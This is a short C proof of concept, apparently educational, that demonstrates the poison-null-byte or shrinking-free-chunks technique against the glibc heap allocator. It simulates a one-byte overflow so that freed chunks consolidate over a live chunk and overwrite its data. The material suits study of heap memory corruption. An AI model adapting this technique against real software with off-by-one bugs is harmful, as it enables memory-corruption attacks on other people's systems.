#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

struct chunk_structure {
  size_t prev_size;
  size_t size;
  struct chunk_structure *fd;
  struct chunk_structure *bk;
  char buf[19];               // padding
};

int main() {
  void *a, *b, *c, *b1, *b2, *big;
  struct chunk_structure *b_chunk, *c_chunk;

  // Grab three consecutive chunks in memory
  a = malloc(0x100);
  b = malloc(0x200);
  c = malloc(0x100);

  printf("%p\n", a);
  printf("%p\n", b);
  printf("%p\n", c);

  b_chunk = (struct chunk_structure *)(b - 2*sizeof(size_t));
  c_chunk = (struct chunk_structure *)(c - 2*sizeof(size_t));

  // free b, now there is a large gap between 'a' and 'c' in memory
  // b will end up in unsorted bin
  free(b);

  // Attacker overflows 'a' and overwrites least significant byte of b's size
  // with 0x00. This will decrease b's size.
  *(char *)&b_chunk->size = 0x00;

  // Allocate another chunk
  // 'b' will be used to service this chunk.
  // c's previous size will not updated. In fact, the update will be done a few
  // bytes before c's previous size as b's size has decreased.
  // So, b + b->size is behind c.
  // c will assume that the previous chunk (c - c->prev_size = b/b1) is free
  b1 = malloc(0x80);
  printf("%p\n", b1);

  // Allocate another chunk
  // This will come directly after b1
  b2 = malloc(0x80);
  printf("%p\n", b2);

  strcpy(b2, "victim's data");
  
  // Free b1
  free(b1);

  // Free c
  // This will now consolidate with b/b1 thereby merging b2 within it
  // This is because c's prev_in_use bit is still 0 and its previous size
  // points to b/b1
  free(c);

  // Allocate a big chunk to cover b2's memory as well
  big = malloc(0x200);
  printf("%p\n", big);
  memset(big, 0x41, 0x200 - 1);

  printf("%s\n", (char *)b2);       // Prints AAAAAAAAAAA... !

  return 0;
}
